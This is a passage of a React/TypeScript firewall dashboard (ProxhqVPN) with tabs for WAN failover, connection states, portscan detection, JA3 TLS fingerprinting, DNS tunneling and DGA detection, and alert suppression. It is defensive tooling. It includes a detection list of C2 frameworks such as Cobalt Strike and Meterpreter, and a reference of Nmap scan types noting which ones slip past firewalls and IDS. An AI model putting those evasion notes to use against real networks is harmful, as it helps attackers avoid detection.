  const MODE_COLOR: Record<string,string> = { failover:"#ff9900", load_balance:"#00ff88", round_robin:"#4488ff" };

  const save = async () => {
    if (!form.name) return;
    setSaving(true);
    await fwPost("/wan-groups", form);
    setForm({ name:"", mode:"failover", interfaces:'[{"iface":"eth0","gateway":"192.168.1.1","weight":1,"priority":1}]', triggerLevel:"packetloss", description:"" });
    await reload(); setSaving(false);
  };

  return (
    <div>
      <CardBox title="🌐 WAN Load Balancing / Failover Groups (pfSense/OPNsense)" action={<Btn onClick={reload} color="#555" sm><RefreshCw size={10}/></Btn>}>
        <p style={{ margin:"0 0 14px", fontSize:11, color:"#555" }}>
          Group multiple WAN uplinks for automatic failover or load balancing. Supports failover (primary/secondary), load-balance (distribute sessions across WANs by weight), and round-robin. Trigger on packet loss, latency spike, or link down.
        </p>
        <div style={{ display:"grid", gridTemplateColumns:"1fr 1fr 1fr 1fr 2fr auto", gap:6, marginBottom:12 }}>
          <FwInput placeholder="Group name (e.g. TIER1_WAN)" value={form.name} onChange={e=>setForm(f=>({...f,name:e.target.value}))} />
          <FwSelect value={form.mode} onChange={e=>setForm(f=>({...f,mode:e.target.value}))}>
            <option value="failover">Failover (Primary/Secondary)</option>
            <option value="load_balance">Load Balance (by weight)</option>
            <option value="round_robin">Round Robin</option>
          </FwSelect>
          <FwSelect value={form.triggerLevel} onChange={e=>setForm(f=>({...f,triggerLevel:e.target.value}))}>
            <option value="packetloss">Packet Loss</option>
            <option value="latency">High Latency</option>
            <option value="down">Link Down Only</option>
          </FwSelect>
          <FwInput placeholder="Description" value={form.description} onChange={e=>setForm(f=>({...f,description:e.target.value}))} />
          <FwInput placeholder='[{"iface":"eth0","gateway":"10.0.0.1","weight":1,"priority":1}]' value={form.interfaces} onChange={e=>setForm(f=>({...f,interfaces:e.target.value}))} />
          <Btn onClick={save} color="#00ff88">{saving?"Saving…":"+ Add"}</Btn>
        </div>
        {loading ? <Spinner/> : (
          <table style={{ width:"100%", borderCollapse:"collapse" }}>
            <thead><tr><TH>Name</TH><TH>Mode</TH><TH>Trigger Level</TH><TH>Interfaces</TH><TH>Status</TH><TH>Actions</TH></tr></thead>
            <tbody>
              {!data?.groups?.length ? <EmptyRow cols={6} msg="No WAN groups configured."/> : data.groups.map(g => {
                let ifaces: Array<{iface:string;gateway:string;weight:number;priority:number}> = [];
                try { ifaces = JSON.parse(g.interfaces); } catch {}
                return (
                  <tr key={g.id}>
                    <TD mono c="#fff">{g.name}</TD>
                    <TD><Bdg label={g.mode.replace("_"," ")} color={MODE_COLOR[g.mode]??"#888"} sm/></TD>
                    <TD mono c="#888">{g.triggerLevel}</TD>
                    <td style={{ padding:"6px 10px", borderBottom:"1px solid #111", fontSize:11 }}>
                      {ifaces.map((i,idx)=>(
                        <span key={idx} style={{ marginRight:8, color:"#ccc", fontFamily:"monospace" }}>
                          {i.iface}<span style={{ color:"#555" }}> → {i.gateway}</span> <span style={{ color:"#888", fontSize:10 }}>w:{i.weight}</span>
                        </span>
                      ))}
                    </td>
                    <TD><Bdg label={g.enabled?"ON":"OFF"} color={g.enabled?"#00ff88":"#444"} sm/></TD>
                    <td style={{ padding:"6px 10px", borderBottom:"1px solid #111" }}>
                      <div style={{ display:"flex", gap:4 }}>
                        <Btn onClick={async()=>{await fwPut(`/wan-groups/${g.id}`,{enabled:!g.enabled}); await reload();}} color={g.enabled?"#ff9900":"#00ff88"} sm>{g.enabled?"Disable":"Enable"}</Btn>
                        <Btn onClick={async()=>{await fwDelete(`/wan-groups/${g.id}`); await reload();}} color="#ff4444" sm><Trash2 size={10}/></Btn>
                      </div>
                    </td>
                  </tr>
                );
              })}
            </tbody>
          </table>
        )}
      </CardBox>
      <CardBox title="📚 WAN Group Modes Explained">
        <div style={{ display:"grid", gridTemplateColumns:"1fr 1fr 1fr", gap:12 }}>
          {[
            { mode:"Failover", color:"#ff9900", desc:"Assigns a priority order to uplinks. Traffic flows through the highest-priority active interface. When it fails (detected by packet loss/latency/link-down), traffic automatically shifts to the next interface. Zero manual intervention required." },
            { mode:"Load Balance", color:"#00ff88", desc:"Distributes new sessions across multiple WAN interfaces according to their weight. A weight-2 link gets twice the sessions of a weight-1 link. Existing sessions stay on their assigned interface until closed." },
            { mode:"Round Robin", color:"#4488ff", desc:"Assigns each new connection to the next WAN interface in sequence, cycling through all active uplinks equally. Simple and fair, but does not account for interface speed differences — use Load Balance if uplinks have different capacities." },
          ].map(m=>(
            <div key={m.mode} style={{ background:"#111", borderRadius:6, padding:12 }}>
              <div style={{ fontFamily:"monospace", fontSize:12, fontWeight:700, color:m.color, marginBottom:8 }}>{m.mode}</div>
              <p style={{ margin:0, fontSize:11, color:"#666", lineHeight:1.6 }}>{m.desc}</p>
            </div>
          ))}
        </div>
      </CardBox>
    </div>
  );
}

// ── 6. CONNECTION STATE TABLE ─────────────────────────────────────────────────
function StateTableTab() {
  const { data, loading, reload } = useFw<{ states: Array<{proto:string;state:string;recv:string;send:string;localAddr:string;peerAddr:string;process:string;isBlocked:boolean}>; total:number; established:number; timeWait:number; listening:number }>("/state-table");
  const [search, setSearch] = useState("");

  const STATE_COLOR: Record<string,string> = { ESTABLISHED:"#00ff88", LISTEN:"#4488ff", "TIME-WAIT":"#ff9900", CLOSE_WAIT:"#ff6600", FIN_WAIT1:"#888", FIN_WAIT2:"#888", SYN_SENT:"#ffaa00", SYN_RECV:"#cc44ff" };

  const filtered = (data?.states ?? []).filter(s =>
    !search || s.peerAddr.includes(search) || s.localAddr.includes(search) || s.process.includes(search) || s.proto.includes(search)
  );

  return (
    <div>
      <CardBox title="🔌 Connection State Table (pfSense/OPNsense live ss output)" action={
        <div style={{ display:"flex", gap:8, alignItems:"center" }}>
          <FwInput placeholder="Filter by IP / process…" value={search} onChange={e=>setSearch(e.target.value)} style={{ width:200 }} />
          <Btn onClick={reload} color="#555" sm><RefreshCw size={10}/> Refresh</Btn>
        </div>
      }>
        <div style={{ display:"flex", gap:20, marginBottom:14 }}>
          {[{l:"Total",v:data?.total??0,c:"#ccc"},{l:"Established",v:data?.established??0,c:"#00ff88"},{l:"Time-Wait",v:data?.timeWait??0,c:"#ff9900"},{l:"Listening",v:data?.listening??0,c:"#4488ff"}].map(s=>(
            <div key={s.l} style={{ textAlign:"center" }}>
              <div style={{ fontFamily:"monospace", fontSize:18, fontWeight:700, color:s.c }}>{s.v}</div>
              <div style={{ fontSize:10, color:"#555" }}>{s.l}</div>
            </div>
          ))}
        </div>
        {loading ? <Spinner/> : (
          <div style={{ maxHeight:400, overflowY:"auto" }}>
            <table style={{ width:"100%", borderCollapse:"collapse" }}>
              <thead><tr><TH>Proto</TH><TH>State</TH><TH>Local Address</TH><TH>Peer Address</TH><TH>Recv-Q</TH><TH>Send-Q</TH><TH>Process</TH><TH>Threat</TH></tr></thead>
              <tbody>
                {!filtered.length ? <EmptyRow cols={8} msg="No active connections found."/> : filtered.map((s,i)=>(
                  <tr key={i} style={{ background: s.isBlocked?"#ff220211":"transparent" }}>
                    <TD mono c="#4488ff">{s.proto}</TD>
                    <TD><Bdg label={s.state||"—"} color={STATE_COLOR[s.state]??"#555"} sm/></TD>
                    <TD mono c="#888">{s.localAddr}</TD>
                    <TD mono c={s.isBlocked?"#ff4444":"#ccc"}>{s.peerAddr}</TD>
                    <TD mono c="#666">{s.recv}</TD>
                    <TD mono c="#666">{s.send}</TD>
                    <TD mono c="#555">{s.process||"—"}</TD>
                    <TD>{s.isBlocked?<Bdg label="BLOCKED" color="#ff4444" sm/>:"—"}</TD>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        )}
      </CardBox>
    </div>
  );
}

// ── 7. PORTSCAN DETECTION ─────────────────────────────────────────────────────
function PortscansTab() {
  const { data, loading, reload } = useFw<{ events: Array<{id:number;sourceIp:string;destIp:string|null;scanType:string;portCount:number;tcpFlags:string|null;packetCount:number;blocked:boolean;addedToBlock:boolean;geoCountry:string|null;detectedAt:string}> }>("/portscans");
  const [testForm, setTestForm] = useState({ sourceIp:"", ports:"22,80,443,3306,5432,8080,8443", tcpFlags:"SYN" });
  const [testResult, setTestResult] = useState<{scanType:string;autoBlocked:boolean}|null>(null);
  const [testing, setTesting] = useState(false);

  const SCAN_COLOR: Record<string,string> = { syn:"#ff4444", fin:"#ff9900", xmas:"#cc44ff", null:"#4488ff", ack:"#ffaa00", udp:"#00aaff", slow:"#888" };

  const runTest = async () => {
    if (!testForm.sourceIp) return;
    setTesting(true);
    const ports = testForm.ports.split(",").map(p=>parseInt(p.trim())).filter(Boolean);
    const res = await fwPost("/portscans/detect", { ...testForm, ports });
    setTestResult(res);
    await reload();
    setTesting(false);
  };

  return (
    <div>
      <CardBox title="🔍 Portscan Detection Engine (Snort sfPortscan / Suricata)" action={
        <div style={{ display:"flex", gap:8 }}>
          <Btn onClick={async()=>{await fwDelete("/portscans"); await reload();}} color="#ff4444" sm><Trash2 size={10}/> Clear Log</Btn>
          <Btn onClick={reload} color="#555" sm><RefreshCw size={10}/></Btn>
        </div>
      }>
        <p style={{ margin:"0 0 14px", fontSize:11, color:"#555" }}>
          Detects SYN, FIN, XMAS, NULL, ACK, UDP, Maimon, and slow-rate port scans. Automatically blocks aggressive scanners (&gt;20 ports) by adding them to the firewall blacklist. Equivalent to Snort's sfPortscan preprocessor and Suricata's portscan detection.
        </p>
        {/* Test Detector */}
        <div style={{ background:"#111", borderRadius:6, padding:12, marginBottom:14 }}>
          <div style={{ fontFamily:"monospace", fontSize:11, fontWeight:700, color:"#ff9900", marginBottom:8 }}>🧪 Test Portscan Detector</div>
          <div style={{ display:"flex", gap:8, alignItems:"center", flexWrap:"wrap" }}>
            <FwInput placeholder="Source IP to simulate" value={testForm.sourceIp} onChange={e=>setTestForm(f=>({...f,sourceIp:e.target.value}))} />
            <FwInput placeholder="Ports (comma-sep)" value={testForm.ports} onChange={e=>setTestForm(f=>({...f,ports:e.target.value}))} style={{ width:250 }} />
            <FwSelect value={testForm.tcpFlags} onChange={e=>setTestForm(f=>({...f,tcpFlags:e.target.value}))}>
              <option value="SYN">SYN Scan</option>
              <option value="FIN">FIN Scan</option>
              <option value="URG|PSH|FIN">XMAS Scan</option>
              <option value="NULL">NULL Scan</option>
              <option value="ACK">ACK Scan</option>
              <option value="WINDOW">Window Scan</option>
            </FwSelect>
            <Btn onClick={runTest} color="#ff9900">{testing?"Detecting…":"Detect"}</Btn>
            {testResult && (
              <div style={{ fontFamily:"monospace", fontSize:11 }}>
                <Bdg label={testResult.scanType.toUpperCase()} color={SCAN_COLOR[testResult.scanType]??"#888"} sm/>
                {testResult.autoBlocked && <Bdg label="AUTO-BLOCKED" color="#ff4444" sm/>}
              </div>
            )}
          </div>
        </div>

        {loading ? <Spinner/> : (
          <table style={{ width:"100%", borderCollapse:"collapse" }}>
            <thead><tr><TH>Source IP</TH><TH>Scan Type</TH><TH>TCP Flags</TH><TH>Ports</TH><TH>Packets</TH><TH>Blocked</TH><TH>Time</TH></tr></thead>
            <tbody>
              {!data?.events?.length ? <EmptyRow cols={7} msg="No portscan events logged. Use the test tool above to simulate a scan."/> : data.events.map(e=>(
                <tr key={e.id} style={{ background: e.blocked?"#ff220211":"transparent" }}>
                  <TD mono c={e.blocked?"#ff4444":"#fff"}>{e.sourceIp}</TD>
                  <TD><Bdg label={e.scanType.toUpperCase()} color={SCAN_COLOR[e.scanType]??"#888"} sm/></TD>
                  <TD mono c="#888">{e.tcpFlags ?? "—"}</TD>
                  <TD mono c="#ff9900">{e.portCount} ports</TD>
                  <TD mono c="#666">{e.packetCount}</TD>
                  <TD>{e.blocked?<Bdg label={e.addedToBlock?"BLACKLISTED":"BLOCKED"} color="#ff4444" sm/>:"—"}</TD>
                  <TD mono c="#444">{new Date(e.detectedAt).toLocaleString()}</TD>
                </tr>
              ))}
            </tbody>
          </table>
        )}
      </CardBox>
      <CardBox title="📋 Port Scan Types Reference">
        <div style={{ display:"grid", gridTemplateColumns:"repeat(4,1fr)", gap:10 }}>
          {[
            { type:"SYN (Half-Open)", flags:"SYN", color:"#ff4444", desc:"Most common. Sends SYN, waits for SYN-ACK, never completes handshake. Stealthy, fast, and reliable. Used by Nmap -sS." },
            { type:"FIN Scan",        flags:"FIN", color:"#ff9900", desc:"Sends FIN packet. Open ports ignore it; closed ports reply RST. Bypasses some stateless firewalls and older IDS. Nmap -sF." },
            { type:"XMAS Scan",       flags:"FIN+URG+PSH", color:"#cc44ff", desc:"All flags set — 'lit up like a Christmas tree'. Same behavior as FIN scan. Stands out in packet captures. Nmap -sX." },
            { type:"NULL Scan",       flags:"(none)", color:"#4488ff", desc:"No flags set. Open ports ignore; closed ports reply RST. Often evades simple ACL rules expecting standard flags. Nmap -sN." },
            { type:"ACK Scan",        flags:"ACK", color:"#ffaa00", desc:"Maps firewall rules by probing filtered vs unfiltered ports. Cannot detect open/closed — only whether filtered. Nmap -sA." },
            { type:"UDP Scan",        flags:"UDP", color:"#00aaff", desc:"Sends UDP packets. No response = open|filtered; ICMP unreachable = closed. Slow and unreliable but necessary for UDP services." },
            { type:"Window Scan",     flags:"RST+ACK", color:"#888", desc:"Exploits TCP window size in RST packets. Behavior is OS-dependent — may reveal open ports on certain OS versions." },
            { type:"Slow/Decoy Scan", flags:"SYN (slow)", color:"#666", desc:"Spreads probes over a long time window (minutes/hours) to evade rate-based IDS detection thresholds. Detected by sustained port spread." },
          ].map(s=>(
            <div key={s.type} style={{ background:"#111", borderRadius:6, padding:10 }}>
              <div style={{ fontFamily:"monospace", fontSize:11, fontWeight:700, color:s.color, marginBottom:4 }}>{s.type}</div>
              <div style={{ fontSize:10, color:"#555", marginBottom:4, fontFamily:"monospace" }}>Flags: {s.flags}</div>
              <p style={{ margin:0, fontSize:10, color:"#666", lineHeight:1.5 }}>{s.desc}</p>
            </div>
          ))}
        </div>
      </CardBox>
    </div>
  );
}

// ── 8. JA3/JA3S TLS FINGERPRINTING ──────────────────────────────────────────
function TlsTab() {
  const { data, loading, reload } = useFw<{ fingerprints: Array<{id:number;ja3Hash:string;ja3String:string|null;ja3sHash:string|null;verdict:string;malwareFamily:string|null;description:string|null;action:string;hitCount:number;firstSeen:string;lastSeen:string}> }>("/tls-fingerprints");
  const [lookupHash, setLookupHash] = useState("");
  const [lookupResult, setLookupResult] = useState<{found:boolean;verdict?:string;fingerprint?:{verdict?:string;malwareFamily:string|null;description:string|null;action:string}}|null>(null);

  const VERDICT_COLOR: Record<string,string> = { malicious:"#ff2244", suspicious:"#ff9900", clean:"#00ff88", unknown:"#555" };

  const seed = async () => { await fwPost("/tls-fingerprints/seed",{}); await reload(); };
  const doLookup = async () => {
    if (!lookupHash) return;
    const res = await fwPost("/tls-fingerprints/lookup", { ja3Hash: lookupHash });
    setLookupResult(res);
  };

  return (
    <div>
      <CardBox title="🔐 JA3/JA3S TLS Fingerprinting (Suricata / Zeek)" action={
        <div style={{ display:"flex", gap:8 }}>
          <Btn onClick={seed} color="#4488ff" sm>Seed JA3 Threat DB</Btn>
          <Btn onClick={reload} color="#555" sm><RefreshCw size={10}/></Btn>
        </div>
      }>
        <p style={{ margin:"0 0 14px", fontSize:11, color:"#555" }}>
          JA3 fingerprints TLS Client Hello parameters (SSLVersion, Ciphers, Extensions, EllipticCurves, EllipticCurvePointFormats) into an MD5 hash. Malware C2 frameworks have distinctive JA3 hashes regardless of domain or IP — Cobalt Strike, Metasploit, Sliver, Havoc, QakBot, Emotet all have known fingerprints.
        </p>

        {/* JA3 Lookup */}
        <div style={{ background:"#111", borderRadius:6, padding:12, marginBottom:14 }}>
          <div style={{ fontFamily:"monospace", fontSize:11, fontWeight:700, color:"#cc44ff", marginBottom:8 }}>🔎 JA3 Hash Lookup</div>
          <div style={{ display:"flex", gap:8 }}>
            <FwInput placeholder="Enter 32-char MD5 JA3 hash…" value={lookupHash} onChange={e=>setLookupHash(e.target.value)} style={{ width:320 }} />
            <Btn onClick={doLookup} color="#cc44ff">Lookup</Btn>
          </div>
          {lookupResult && (
            <div style={{ marginTop:10, fontFamily:"monospace", fontSize:11 }}>
              {lookupResult.found ? (
                <div style={{ display:"flex", gap:10, alignItems:"center" }}>
                  <Bdg label={lookupResult.fingerprint?.verdict?.toUpperCase()??"?"} color={VERDICT_COLOR[lookupResult.fingerprint?.verdict??""]} sm/>
                  <span style={{ color:"#ff4444" }}>{lookupResult.fingerprint?.malwareFamily ?? "Unknown malware"}</span>
                  <span style={{ color:"#555" }}>— {lookupResult.fingerprint?.description}</span>
                </div>
              ) : (
                <span style={{ color:"#555" }}>Hash not found in local database. Hash may be a legitimate client (Chrome/Firefox default JA3 not flagged).</span>
              )}
            </div>
          )}
        </div>

        {loading ? <Spinner/> : (
          <table style={{ width:"100%", borderCollapse:"collapse" }}>
            <thead><tr><TH>JA3 Hash</TH><TH>Malware Family</TH><TH>Verdict</TH><TH>Action</TH><TH>Hits</TH><TH>Description</TH><TH>Actions</TH></tr></thead>
            <tbody>
              {!data?.fingerprints?.length ? <EmptyRow cols={7} msg="No JA3 fingerprints. Click 'Seed JA3 Threat DB' to load known C2 hashes."/> : data.fingerprints.map(fp=>(
                <tr key={fp.id} style={{ background: fp.verdict==="malicious"?"#ff220211":"transparent" }}>
                  <td style={{ padding:"6px 10px", borderBottom:"1px solid #111", fontFamily:"monospace", fontSize:10, color:"#888" }}>
                    {fp.ja3Hash}<CopyBtn text={fp.ja3Hash}/>
                  </td>
                  <TD c={fp.verdict==="malicious"?"#ff4444":"#ccc"}>{fp.malwareFamily ?? "—"}</TD>
                  <TD><Bdg label={fp.verdict} color={VERDICT_COLOR[fp.verdict]??"#555"} sm/></TD>
                  <TD><Bdg label={fp.action} color={fp.action==="block"?"#ff4444":fp.action==="alert"?"#ff9900":"#00ff88"} sm/></TD>
                  <TD mono c="#ff9900">{fp.hitCount}</TD>
                  <TD c="#666">{fp.description?.substring(0,60)}{(fp.description?.length??0)>60?"…":""}</TD>
                  <td style={{ padding:"6px 10px", borderBottom:"1px solid #111" }}>
                    <Btn onClick={async()=>{await fwDelete(`/tls-fingerprints/${fp.id}`); await reload();}} color="#ff4444" sm><Trash2 size={10}/></Btn>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        )}
      </CardBox>
      <CardBox title="🦠 Known Malicious JA3 Hashes — Reference">
        <p style={{ margin:"0 0 12px", fontSize:11, color:"#555" }}>These C2 frameworks have distinctive TLS fingerprints detected by JA3. After seeding the database above, ProxhqVPN will alert or block connections matching any of these hashes — regardless of domain or destination IP.</p>
        <div style={{ display:"grid", gridTemplateColumns:"repeat(4,1fr)", gap:8 }}>
          {["Cobalt Strike","Metasploit Meterpreter","Dridex","Trickbot","Emotet","AsyncRAT","Sliver C2","Havoc C2","QakBot","IcedID","Brute Ratel C4","Meterpreter HTTPS"].map(f=>(
            <div key={f} style={{ background:"#ff220211", border:"1px solid #ff222233", borderRadius:5, padding:"8px 10px", fontFamily:"monospace", fontSize:10, color:"#ff4444" }}>⚠ {f}</div>
          ))}
        </div>
      </CardBox>
    </div>
  );
}

// ── 9. DNS SECURITY MONITOR ──────────────────────────────────────────────────
function DnsMonitorTab() {
  const { data, loading, reload } = useFw<{ events: Array<{id:number;queryName:string;queryType:string;sourceIp:string|null;verdict:string;dgaScore:number;tunnelingScore:number;blocked:boolean;detectedAt:string}>; stats:{total:number;dga:number;tunneling:number;blocked:number} }>("/dns-security/events");
  const [analyzeForm, setAnalyzeForm] = useState({ queryName:"", queryType:"A", sourceIp:"" });
  const [analyzeResult, setAnalyzeResult] = useState<{verdict:string;dga:{score:number;isDGA:boolean;reason:string};tunneling:{score:number;isTunneling:boolean}}|null>(null);
  const [analyzing, setAnalyzing] = useState(false);

  const VERDICT_COLOR: Record<string,string> = { clean:"#00ff88", dga:"#ff4444", tunneling:"#cc44ff", malware:"#ff2244", phishing:"#ff6600", suspicious:"#ff9900" };

  const analyze = async () => {
    if (!analyzeForm.queryName) return;
    setAnalyzing(true);
    const res = await fwPost("/dns-security/analyze", analyzeForm);
    setAnalyzeResult(res);
    await reload();
    setAnalyzing(false);
  };

  return (
    <div>
      <CardBox title="🌐 DNS Security Monitor — DGA & Tunneling Detection (Snort/Suricata/IPFire)" action={<Btn onClick={reload} color="#555" sm><RefreshCw size={10}/></Btn>}>
        <p style={{ margin:"0 0 14px", fontSize:11, color:"#555" }}>
          Analyzes DNS queries in real-time for Domain Generation Algorithm (DGA) domains used by malware for C2, and DNS tunneling (data exfiltration via DNS TXT/CNAME records). Uses Shannon entropy, consonant ratio, digit ratio, and subdomain depth heuristics — identical to Suricata's dns.events logging and Snort's preprocessor.
        </p>

        {/* Stats row */}
        <div style={{ display:"flex", gap:20, marginBottom:16 }}>
          {[{l:"Total Queries",v:data?.stats?.total??0,c:"#ccc"},{l:"DGA Detections",v:data?.stats?.dga??0,c:"#ff4444"},{l:"Tunneling",v:data?.stats?.tunneling??0,c:"#cc44ff"},{l:"Blocked",v:data?.stats?.blocked??0,c:"#ff2244"}].map(s=>(
            <div key={s.l} style={{ textAlign:"center" }}>
              <div style={{ fontFamily:"monospace", fontSize:20, fontWeight:700, color:s.c }}>{s.v}</div>
              <div style={{ fontSize:10, color:"#555" }}>{s.l}</div>
            </div>
          ))}
        </div>

        {/* Live Analyzer */}
        <div style={{ background:"#111", borderRadius:6, padding:12, marginBottom:14 }}>
          <div style={{ fontFamily:"monospace", fontSize:11, fontWeight:700, color:"#4488ff", marginBottom:8 }}>🔬 Analyze DNS Query</div>
          <div style={{ display:"flex", gap:8, flexWrap:"wrap", alignItems:"center" }}>
            <FwInput placeholder="Domain to analyze (e.g. xn--4ca.r4nd0m-c2.xyz)" value={analyzeForm.queryName} onChange={e=>setAnalyzeForm(f=>({...f,queryName:e.target.value}))} style={{ width:320 }} />
            <FwSelect value={analyzeForm.queryType} onChange={e=>setAnalyzeForm(f=>({...f,queryType:e.target.value}))}>
              <option>A</option><option>AAAA</option><option>TXT</option><option>MX</option><option>NS</option><option>CNAME</option>
            </FwSelect>
            <FwInput placeholder="Source IP (optional)" value={analyzeForm.sourceIp} onChange={e=>setAnalyzeForm(f=>({...f,sourceIp:e.target.value}))} style={{ width:150 }} />
            <Btn onClick={analyze} color="#4488ff">{analyzing?"Analyzing…":"Analyze"}</Btn>
          </div>
          {analyzeResult && (
            <div style={{ marginTop:10, display:"flex", gap:12, alignItems:"center", flexWrap:"wrap" }}>
              <Bdg label={analyzeResult.verdict.toUpperCase()} color={VERDICT_COLOR[analyzeResult.verdict]??"#555"} sm/>
              <span style={{ fontFamily:"monospace", fontSize:11, color:"#888" }}>DGA score: <span style={{ color:analyzeResult.dga.score>40?"#ff4444":"#00ff88" }}>{analyzeResult.dga.score}/100</span></span>
              <span style={{ fontFamily:"monospace", fontSize:11, color:"#888" }}>Tunneling score: <span style={{ color:analyzeResult.tunneling.score>40?"#cc44ff":"#00ff88" }}>{analyzeResult.tunneling.score}/100</span></span>
              {analyzeResult.dga.reason && <span style={{ fontFamily:"monospace", fontSize:10, color:"#555" }}>Flags: {analyzeResult.dga.reason}</span>}
            </div>
          )}
        </div>

        {loading ? <Spinner/> : (
          <table style={{ width:"100%", borderCollapse:"collapse" }}>
            <thead><tr><TH>Domain</TH><TH>Type</TH><TH>Source IP</TH><TH>Verdict</TH><TH>DGA Score</TH><TH>Tunnel Score</TH><TH>Blocked</TH><TH>Time</TH></tr></thead>
            <tbody>
              {!data?.events?.length ? <EmptyRow cols={8} msg="No DNS events. Use the analyzer above to test suspicious domains."/> : data.events.map(e=>(
                <tr key={e.id} style={{ background: e.blocked?"#ff220211":e.verdict!=="clean"?"#ff990011":"transparent" }}>
                  <TD mono c={e.verdict==="clean"?"#888":"#fff"}>{e.queryName}</TD>
                  <TD mono c="#555">{e.queryType}</TD>
                  <TD mono c="#666">{e.sourceIp ?? "—"}</TD>
                  <TD><Bdg label={e.verdict} color={VERDICT_COLOR[e.verdict]??"#555"} sm/></TD>
                  <TD mono c={e.dgaScore>40?"#ff4444":"#888"}>{e.dgaScore}/100</TD>
                  <TD mono c={e.tunnelingScore>40?"#cc44ff":"#888"}>{e.tunnelingScore}/100</TD>
                  <TD>{e.blocked?<Bdg label="BLOCKED" color="#ff4444" sm/>:"—"}</TD>
                  <TD mono c="#444">{new Date(e.detectedAt).toLocaleString()}</TD>
                </tr>
              ))}
            </tbody>
          </table>
        )}
      </CardBox>
    </div>
  );
}

// ── 10. ALERT SUPPRESSION / THRESHOLD RULES ───────────────────────────────────
function SuppressionsTab() {
  const { data, loading, reload } = useFw<{ rules: Array<{id:number;name:string;type:string;track:string;trackValue:string|null;wafRuleId:number|null;attackType:string|null;count:number;seconds:number;enabled:boolean;description:string|null}> }>("/suppressions");
  const [form, setForm] = useState({ name:"", type:"suppress", track:"by_src", trackValue:"", attackType:"", count:"5", seconds:"60", description:"" });
  const [checkForm, setCheckForm] = useState({ attackType:"", sourceIp:"" });
  const [checkResult, setCheckResult] = useState<{suppressed:boolean;rule?:string;reason?:string}|null>(null);
  const [saving, setSaving] = useState(false);

  const TYPE_COLOR: Record<string,string> = { suppress:"#ff9900", threshold:"#4488ff", rate_filter:"#cc44ff" };

  const save = async () => {
    if (!form.name) return;
    setSaving(true);
    await fwPost("/suppressions", { ...form, count:parseInt(form.count), seconds:parseInt(form.seconds) });
    setForm({ name:"", type:"suppress", track:"by_src", trackValue:"", attackType:"", count:"5", seconds:"60", description:"" });
    await reload(); setSaving(false);
  };
  const checkSuppression = async () => {
    const res = await fwPost("/suppressions/check", checkForm);
    setCheckResult(res);
  };

  return (
    <div>
      <CardBox title="🔕 Alert Suppression / Threshold Rules (Snort/Suricata)" action={<Btn onClick={reload} color="#555" sm><RefreshCw size={10}/></Btn>}>
        <p style={{ margin:"0 0 14px", fontSize:11, color:"#555" }}>
          Reduce false-positive noise from WAF/IPS rules. Suppress a rule entirely for a specific IP (equivalent to Snort's suppress keyword), or set a threshold to only alert after N events in T seconds. Identical to Suricata's threshold.conf suppress and threshold blocks.
        </p>
        <div style={{ display:"grid", gridTemplateColumns:"1fr 1fr 1fr 1fr 1fr 1fr 1fr 1fr auto", gap:6, marginBottom:12 }}>
          <FwInput placeholder="Rule name" value={form.name} onChange={e=>setForm(f=>({...f,name:e.target.value}))} />
          <FwSelect value={form.type} onChange={e=>setForm(f=>({...f,type:e.target.value}))}>
            <option value="suppress">Suppress</option>
            <option value="threshold">Threshold</option>
            <option value="rate_filter">Rate Filter</option>
          </FwSelect>
          <FwSelect value={form.track} onChange={e=>setForm(f=>({...f,track:e.target.value}))}>
            <option value="by_src">By Source IP</option>
            <option value="by_dst">By Dest IP</option>
            <option value="by_rule">By Rule</option>
            <option value="global">Global</option>
          </FwSelect>
          <FwInput placeholder="Track value (IP / CIDR)" value={form.trackValue} onChange={e=>setForm(f=>({...f,trackValue:e.target.value}))} />
          <FwInput placeholder="Attack type (e.g. sqli)" value={form.attackType} onChange={e=>setForm(f=>({...f,attackType:e.target.value}))} />
          <FwInput placeholder="Count" type="number" value={form.count} onChange={e=>setForm(f=>({...f,count:e.target.value}))} />
          <FwInput placeholder="Seconds" type="number" value={form.seconds} onChange={e=>setForm(f=>({...f,seconds:e.target.value}))} />
          <FwInput placeholder="Description" value={form.description} onChange={e=>setForm(f=>({...f,description:e.target.value}))} />
          <Btn onClick={save} color="#00ff88">{saving?"Saving…":"+ Add"}</Btn>
        </div>

        {/* Suppression checker */}
        <div style={{ background:"#111", borderRadius:6, padding:12, marginBottom:14 }}>
          <div style={{ fontFamily:"monospace", fontSize:11, fontWeight:700, color:"#ff9900", marginBottom:8 }}>🔎 Check Suppression</div>
          <div style={{ display:"flex", gap:8, alignItems:"center" }}>
            <FwInput placeholder="Attack type" value={checkForm.attackType} onChange={e=>setCheckForm(f=>({...f,attackType:e.target.value}))} />
            <FwInput placeholder="Source IP" value={checkForm.sourceIp} onChange={e=>setCheckForm(f=>({...f,sourceIp:e.target.value}))} />
            <Btn onClick={checkSuppression} color="#ff9900">Check</Btn>
            {checkResult && (
              <div style={{ display:"flex", gap:8, alignItems:"center" }}>
                <Bdg label={checkResult.suppressed?"SUPPRESSED":"NOT SUPPRESSED"} color={checkResult.suppressed?"#ff9900":"#00ff88"} sm/>
                {checkResult.rule && <span style={{ fontFamily:"monospace", fontSize:11, color:"#555" }}>{checkResult.reason}</span>}
              </div>
            )}
          </div>
        </div>

        {loading ? <Spinner/> : (
          <table style={{ width:"100%", borderCollapse:"collapse" }}>
            <thead><tr><TH>Name</TH><TH>Type</TH><TH>Track</TH><TH>Track Value</TH><TH>Attack Type</TH><TH>Threshold</TH><TH>Status</TH><TH>Actions</TH></tr></thead>
            <tbody>
              {!data?.rules?.length ? <EmptyRow cols={8} msg="No suppression rules. Add rules above to silence noisy WAF/IPS signatures."/> : data.rules.map(r=>(
                <tr key={r.id}>
                  <TD c="#fff">{r.name}</TD>
                  <TD><Bdg label={r.type} color={TYPE_COLOR[r.type]??"#888"} sm/></TD>
                  <TD mono c="#888">{r.track}</TD>
                  <TD mono c="#ccc">{r.trackValue ?? "—"}</TD>
                  <TD mono c="#ff9900">{r.attackType ?? "—"}</TD>
                  <TD mono c="#4488ff">{r.count}× / {r.seconds}s</TD>
                  <TD><Bdg label={r.enabled?"ON":"OFF"} color={r.enabled?"#00ff88":"#444"} sm/></TD>
                  <td style={{ padding:"6px 10px", borderBottom:"1px solid #111" }}>
                    <div style={{ display:"flex", gap:4 }}>
                      <Btn onClick={async()=>{await fwPut(`/suppressions/${r.id}`,{enabled:!r.enabled}); await reload();}} color={r.enabled?"#ff9900":"#00ff88"} sm>{r.enabled?"Disable":"Enable"}</Btn>
                      <Btn onClick={async()=>{await fwDelete(`/suppressions/${r.id}`); await reload();}} color="#ff4444" sm><Trash2 size={10}/></Btn>
